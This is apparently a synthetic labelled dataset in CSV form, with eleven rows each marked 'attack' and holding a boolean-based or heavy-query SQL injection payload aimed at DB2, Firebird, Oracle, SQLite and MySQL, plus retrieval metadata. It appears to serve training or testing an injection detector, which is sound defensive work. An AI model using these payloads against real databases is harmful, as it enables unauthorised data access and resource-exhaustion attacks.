id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,"1""  )   as rqpp where 9383  =  9383 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000165,0.27791288194949293
SMOTE_000002,attack,boolean,"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000622,0.19444870131138461
SMOTE_000003,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000772,0.23416487711436426
SMOTE_000004,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R001168,0.19865457732838473
SMOTE_000005,attack,boolean,"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",nearest_attack_euclidean,R000642,0.09685917347640395
SMOTE_000006,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000288,0.38521713488569326
SMOTE_000007,attack,boolean,"1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000491,0.22698642517971576
SMOTE_000008,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000995,0.6567585998036124
SMOTE_000009,attack,boolean,-3535%'   )    )     )   or 5605  =  4660 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000929,3.110726551922309
SMOTE_000010,attack,boolean,-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,nearest_attack_euclidean,R000404,0.4268516175356646
SMOTE_000011,attack,boolean,"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000261,0.12708915220096528
